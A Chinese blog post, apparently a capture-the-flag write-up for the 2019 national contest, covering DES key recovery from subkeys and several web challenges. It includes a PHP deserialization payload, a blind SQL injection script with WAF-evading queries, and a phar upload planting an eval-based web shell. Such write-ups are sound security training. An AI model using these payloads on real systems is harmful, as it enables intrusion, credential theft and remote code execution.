@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>2019国赛部分题解简略版 - Twings</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期二, 四月 23日 2019, 6:26 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2.1k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      10 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近的国赛，因为题目环境已经关了，所以只简单记录一下思路。</p>
+<p>吹爆队内的 Misc 师傅和二进制爷爷！</p>
+<a id="more"></a>
+<hr>
+<h3 id="part-des（Crypto）"><a href="#part-des（Crypto）" class="headerlink" title="part_des（Crypto）"></a>part_des（Crypto）</h3><p>题目给了两个数据，分别是第 n 轮的密文和16轮中生成的所有子密钥<br>在 DES 算法中，子密钥都是通过密钥生成的，那我们能不能通过子密钥来反推密钥呢？如果能得到密钥，我们使用密钥进行加密，然后在其中第 n 轮修改它的密文，然后再解密最终密文就可以得到明文了。<br>答案是可以的：<a href="https://skysec.top/2017/12/25/%E4%B8%80%E9%81%93%E6%9C%89%E5%85%B3%E5%AF%86%E9%92%A5%E7%BC%96%E6%8E%92%E7%9A%84DES%E9%A2%98%E7%9B%AE/#%E7%94%B1%E5%AD%90%E5%AF%86%E9%92%A5%E5%8F%8D%E6%8E%A8deskey" target="_blank" rel="noopener">https://skysec.top/2017/12/25/%E4%B8%80%E9%81%93%E6%9C%89%E5%85%B3%E5%AF%86%E9%92%A5%E7%BC%96%E6%8E%92%E7%9A%84DES%E9%A2%98%E7%9B%AE/#%E7%94%B1%E5%AD%90%E5%AF%86%E9%92%A5%E5%8F%8D%E6%8E%A8deskey</a></p>
+<p>脚本如下，需要自行修改 pyDes 中的解密函数，对 n=1-16 进行尝试，最后得到 n=13 时 flag 为明文：</p>
+<pre><code class="python">import itertools
+from pyDes import *
+
+key = [
+    &#39;111000001011111001100110000100000011001011010101&#39;,
+    &#39;111100001011011001110110111110000010000010010101&#39;,
+    &#39;111001001101011001110110001000110110001010001111&#39;,
+    &#39;111001101101001101110110001101100011000110000011&#39;,
+    &#39;101011101101001101110011101001100000000101100111&#39;,
+    &#39;101011110101001101111011010001101010101111000010&#39;,
+    &#39;101011110101001111011001011101001000010101011001&#39;,
+    &#39;000111110101101111011001010010111001010001001010&#39;,
+    &#39;001111110100100111011001010010001001011111101010&#39;,
+    &#39;000111110110100110011101000111001101110000101001&#39;,
+    &#39;000111110010110110011101010010100101110001110000&#39;,
+    &#39;010111110010110010101101100010011110100100111000&#39;,
+    &#39;110110111010110010101100101000010101111000010000&#39;,
+    &#39;110110001010111010101110110110010000001000110110&#39;,
+    &#39;111100001011111000101110100101010100101010001100&#39;,
+    &#39;111100001011111010100110000100010010111010000100&#39;
+]
+__pc2 = [
+    13, 16, 10, 23, 0, 4,
+    2, 27, 14, 5, 20, 9,
+    22, 18, 11, 3, 25, 7,
+    15, 6, 26, 19, 12, 1,
+    40, 51, 30, 36, 46, 54,
+    29, 39, 50, 44, 32, 47,
+    43, 48, 38, 55, 33, 52,
+    45, 41, 49, 35, 28, 31
+]
+C1D1 = [&#39;*&#39;] * 56
+for i in range(0, len(key[0])):
+    C1D1[__pc2[i]] = key[0][i]
+print &quot;&quot;.join(C1D1)[:28], &quot;&quot;.join(C1D1)[28:]
+
+C0 = &#39;000000001*11111111*111*10*00&#39;
+D0 = &#39;0000111*11*1001*0000100001*0&#39;
+__pc1 = [56, 48, 40, 32, 24, 16, 8,
+         0, 57, 49, 41, 33, 25, 17,
+         9, 1, 58, 50, 42, 34, 26,
+         18, 10, 2, 59, 51, 43, 35,
+         62, 54, 46, 38, 30, 22, 14,
+         6, 61, 53, 45, 37, 29, 21,
+         13, 5, 60, 52, 44, 36, 28,
+         20, 12, 4, 27, 19, 11, 3
+         ]
+C0D0 = C0 + D0
+res = [&#39;*&#39;] * 64
+deskey = &quot;&quot;
+for i in range(0, len(__pc1)):
+    res[__pc1[i]] = C0D0[i]
+for i in res:
+    deskey += i
+print deskey
+
+def zuoyiwei(str, num):
+    my = str[num:len(str)]
+    my = my + str[0:num]
+    return my
+
+
+def key_change_1(str):
+    key1_list = [57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44,
+                 36, 63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28,
+                 20, 12, 4]
+    res = &quot;&quot;
+    for i in key1_list:
+        res += str[i - 1]
+    return res
+
+
+def key_change_2(str):
+    key2_list = [14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37,
+                 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32]
+    res = &quot;&quot;
+    for i in key2_list:
+        res += str[i - 1]
+    return res
+
+
+def key_gen(str):
+    key_list = []
+    key_change_res = key_change_1(str)
+    key_c = key_change_res[0:28]
+    key_d = key_change_res[28:]
+    for i in range(1, 17):
+        if (i == 1) or (i == 2) or (i == 9) or (i == 16):
+            key_c = zuoyiwei(key_c, 1)
+            key_d = zuoyiwei(key_d, 1)
+        else:
+            key_c = zuoyiwei(key_c, 2)
+            key_d = zuoyiwei(key_d, 2)
+        key_yiwei = key_c + key_d
+        key_res = key_change_2(key_yiwei)
+        key_list.append(key_res)
+    return key_list
+
+
+asdkey = &quot;11001101100111111001011010101100100110010011101001100101&quot;
+qwekey = &quot;11001101100110111001111010111100101110010111101011100101&quot;
+
+print key_gen(deskey)
+unknow = [&#39;111000001011111001100110000100000011001011010101&#39;, &#39;1j1n000010d101100m110110111k100000100000be0a0101&#39;,
+          &#39;11100100jm010d10011101100010001ae11000101000111b&#39;, &#39;1d1001101101001m01110nj0001101b000k10e0110000011&#39;,
+          &#39;10j01110d10100110111001m10k0e1100000000b01100a11&#39;, &#39;1010111m0101001101n110d1010001101e101011a10000k0&#39;,
+          &#39;n0d0111101010011m10j10010b110k00100001010101100a&#39;, &#39;000m1j11010110n111011001e10010a1100101000k00b010&#39;,
+          &#39;00n111110100m00j1d0110010k00100e10010b11111010a0&#39;, &#39;000111110dm010011001110j0001ba00110111000010k001&#39;,
+          &#39;0001111j00101m0d100n1101010010100b0k11000a110e00&#39;, &#39;0m011n1100101100j010110d10001001a1101001e0k11000&#39;,
+          &#39;110j10ndm010110010101100b01000010101ka100001000e&#39;, &#39;1101n00010101110d01011m01101a0e1000000b0001k0110&#39;,
+          &#39;11md0000101111100010nj10100b010k0a00101e10001100&#39;, &#39;11110000101mdj10n010011000010e010010a1k010000b00&#39;]
+
+
+def check(s):
+    look = 1
+    count = 0
+    for y in xrange(16):
+        if s in unknow[y]:
+            count += 1
+            try:
+                assert key[y][unknow[y].index(s)] == &quot;1&quot;
+            except:
+                look = 0
+                break
+    if count == 0:
+        print x + &quot;: Unknow&quot;
+    elif look == 1:
+        print x + &quot;: 1&quot;
+    else:
+        print x + &quot;: 0&quot;
+
+
+for x in &quot;abcdefghijklmnop&quot;:
+    check(x)
+
+key = &quot;110011c110011f111001g110101h110010i110010l111010o110010p&quot;
+
+for x in itertools.product(&quot;01&quot;, repeat=8):
+    my_key = &quot;&quot;
+    count = 0
+    my_key2 = &quot;&quot;
+    for y in xrange(56):
+        if key[y] in [&quot;1&quot;, &quot;0&quot;]:
+            my_key += key[y]
+        else:
+            my_key += x[count]
+            count += 1
+    for y in xrange(8):
+        my_key2 += chr(int(my_key[y * 7: y * 7 + 7], 2))
+    data = &quot;\x23&quot; * 8
+    k = des(my_key2)
+    d = k.encrypt(data)
+    z = k.decrypt(d)
+    print z
+print &quot;Over!&quot;
+</code></pre>
+<h3 id="JustSoso（Web）"><a href="#JustSoso（Web）" class="headerlink" title="JustSoso（Web）"></a>JustSoso（Web）</h3><p>进入题目查看注释，可以看到提示，利用本地文件读取漏洞读取源码，很明显是反序列化题目，只要绕开几个点就可以了：url_parse 用3个/ ，wake_up 用修改成员数量，MD5 比较用指针绕过，脚本如下：</p>
+<pre><code class="php">&lt;?php
+class Handle{
+    private $handle;
+    public function __wakeup(){
+        foreach(get_object_vars($this) as $k =&gt; $v) {
+            $this-&gt;$k = null;
+        }
+        echo &quot;Waking up\n&quot;;
+    }
+    public function __construct($handle) {
+        $this-&gt;handle = $handle;
+    }
+    public function __destruct(){
+        $this-&gt;handle-&gt;getFlag();
+    }
+}
+
+class Flag{
+    public $file;
+    public $token;
+    public $token_flag;
+
+    function __construct($file){
+        $this-&gt;file = $file;
+        $this-&gt;token = &amp;$this-&gt;token_flag;
+    }
+
+    public function getFlag(){
+        $this-&gt;token_flag = md5(2333);
+        if($this-&gt;token === $this-&gt;token_flag)
+        {
+            if(isset($this-&gt;file)){
+                echo @highlight_file($this-&gt;file,true);
+            }
+        }
+    }
+}
+
+$a = new Handle(new Flag(&quot;flag.php&quot;));
+$a = urlencode(serialize($a));
+echo $a;
+</code></pre>
+<h3 id="全宇宙最简单的SQL（Web）"><a href="#全宇宙最简单的SQL（Web）" class="headerlink" title="全宇宙最简单的SQL（Web）"></a>全宇宙最简单的SQL（Web）</h3><p>很坑的题目，首先，主办方开的容器先到先得，晚来的甚至没得做；其次明明是盲注题目，却有知道创宇的 waf 进行拦截，所以我只能用代理来解决。<br>进入题目，看到提示说是一道 SQL 题，先测试一下 WAF，可以看到 or 、sleep 等很多关键词被替换掉了，再多测试可以发现，题目会有两个回显，语法正确和错误，所以尝试采用报错盲注。因为 or 被过滤的原因，所以我们无法获取表名，但是我们可以通过 union 联查进行猜解判断，根据 form 表单的字段名 username、password，猜测得到表名为 user，但是字段名如果是 password，没有 or 我们也无法注入，所以要使用不使用列名的注入方法：<a href="http://www.poluoluo.com/server/201706/547394.html" target="_blank" rel="noopener">http://www.poluoluo.com/server/201706/547394.html</a><br>写出脚本：</p>
+<pre><code class="python">import requests
+
+headers = {
+    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#39;,
+    &#39;Accept-Encoding&#39;: &#39;gzip, deflate, br&#39;,
+    &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.9&#39;,
+    &#39;Cache-Control&#39;: &#39;max-age=0&#39;
+}
+result = &quot;&quot;
+url = &quot;http://5104b761a17d46b289b8e3ab06c17f11d7f717deebd04df2.changame.ichunqiu.com/&quot;
+flag = &quot;F1AG@1s-at_/fll1llag_h3r3&quot;
+for x in xrange(1, 10):
+    for y in xrange(33, 128):
+        payload = &quot;&#39;and (select ascii(mid((select(select e.2 from &quot; \
+                  &quot;(select * from (select 1)a, (select 2)b union select * from user)e &quot; \
+                  &quot;limit 1 offset 1)f),%s,1))=%s)*999*pow(999,102)#&quot; % (x + 1, y)
+        data = {
+            &quot;username&quot;: payload,
+            &quot;password&quot;: &#39;Twings&#39;
+        }
+        content = requests.post(url, data=data, headers=headers).content
+        if &#39;error_403&#39; in content:
+            print &quot;Error: 知道创宇的WAF！&quot;
+            exit(1)
+        if &#39;数据库操作失败！&#39; in content:
+            result += chr(y)
+            print &quot;[Get] &quot; + result
+        if y == 127:
+            print &quot;Error!&quot;
+            exit(1)
+print result
+</code></pre>
+<p>跑出密码，登陆后台，看到后台的连接远程 MySQL功能，联想到 DDCTF 的 MySQL 弱密码题目，根据密码提示的 flag 文件的位置猜测要读文件，所以直接利用别人写好的脚本 rogue_mysql_server.py 。</p>
+<h3 id="love-math（Web）"><a href="#love-math（Web）" class="headerlink" title="love_math（Web）"></a>love_math（Web）</h3><p>利用 base_convert 进制转换拼凑出 _GET，system，getallheaders 或者 readfile 等等字符串，最后使用大括号表示数组即可。</p>
+<h3 id="RefSpace（web）"><a href="#RefSpace（web）" class="headerlink" title="RefSpace（web）"></a>RefSpace（web）</h3><p>进入题目，可以看到一个类似本地文件读取漏洞的参数 ?route=app/index ，利用该漏洞可以一步步获取所有源码（ index.php、app/index.php 、app/flag.php 、backup.zip），还有 web 目录存在 robots.txt，我们可以得到一个上传点 Up10aD.php，上传点只可以上传 jpg 等文件，但是利用文件包含点，我们可以使用 phar 协议进行 getshell：</p>
+<pre><code class="php">$p = new Phar(&#39;twings2.phar&#39;, 0);
+$p[&#39;twings.php&#39;] = &#39;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#39;;
+$p-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;);
+</code></pre>
+<p>修改后缀为 jpg，上传包含 getshell。通过列目录，我们可以得到加密后的flag.txt、sdk.php、和加密的扩展因为sdk.txt 提示的原因，所以我们不去解密这些文件，主要把目光放在他提示的函数上，主要是这里：</p>
+<pre><code class="php">if (sha1($key) === $this-&gt;getHash()) {
+    return &quot;too{young-too-simple}&quot;;
+}
+</code></pre>
+<p>那么我们怎么让这里相同呢？首先我们肯定要知道 getHash 函数的返回值，这里我们可以通过反射来完成，因为是私有变量的原因，所以我们需要调用 setAccessible。得到了 sha1 的结果之后，我们首先尝试了进行解密，结果各个网站都失败了，我们不得不开始想别的办法，有没有办法覆盖 sha1 函数？结果我们在 php.net 上面看到一句话，说 PHP 不支持也不可能有函数重载、删除等等，所以我们也只能放弃了这个思路。后来看到 flag.php 中的那么一行代码：use interesting\FlagSDK; 那我们能不能使用命名空间做文章？就像一般函数的命名空间都是 \ 一样，如果我们修改了命名空间，然后重新定义函数，就可以操控 sha1 的返回了。</p>
+<hr>
+<p>Orx</p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/04/25/反射/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>反射</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/04/23/DDCTF2019-Pwn-strike/">
+                        <span>DDCTF2019 [Pwn]strike</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "2019国赛部分题解简略版&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
